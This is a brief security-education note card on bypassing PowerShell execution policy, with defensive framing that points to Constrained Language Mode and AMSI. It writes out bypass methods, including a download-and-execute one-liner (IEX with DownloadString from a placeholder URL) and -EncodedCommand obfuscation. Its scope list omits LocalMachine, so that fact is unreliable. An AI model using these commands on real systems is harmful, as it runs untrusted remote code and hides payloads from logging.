# Execution Policy Bypass

## What it is
Think of PowerShell's execution policy like a "no running in the halls" school rule — it discourages casual script execution, but a determined student can simply walk very fast. Execution Policy Bypass refers to techniques that circumvent PowerShell's `ExecutionPolicy` setting, which is a preference control (not a security boundary) that restricts which scripts can run. Because Microsoft explicitly designed it as a usability feature rather than a hard security control, it can be defeated through numerous built-in methods.

## Why it matters
In the 2020 SolarWinds supply chain attack, adversaries used PowerShell extensively to execute encoded, in-memory payloads — techniques that sidestep execution policy entirely because the code never touches disk as a `.ps1` file. Defenders who rely solely on execution policy to block malicious scripts will find it provides essentially no resistance against a motivated attacker using encoded commands or piped input.

## Key facts
- `Set-ExecutionPolicy Bypass` or launching PowerShell with `-ExecutionPolicy Bypass` flag instantly overrides the policy for that session — no admin rights required in many configurations
- Piping a script via `IEX (New-Object Net.WebClient).DownloadString('url')` bypasses policy because the code is treated as a string, not a script file
- Execution policy operates at four scopes: `MachinePolicy`, `UserPolicy`, `Process`, and `CurrentUser` — Group Policy (`MachinePolicy`) is the only scope attackers cannot override without admin privileges
- Base64-encoded commands using `-EncodedCommand` flag bypass policy while also obfuscating payload content from simple log inspection
- PowerShell Constrained Language Mode (CLM) and AMSI (Antimalware Scan Interface) are the actual security controls defenders should layer on top of execution policy

## Related concepts
[[PowerShell Logging]] [[AMSI (Antimalware Scan Interface)]] [[Living Off the Land Attacks]]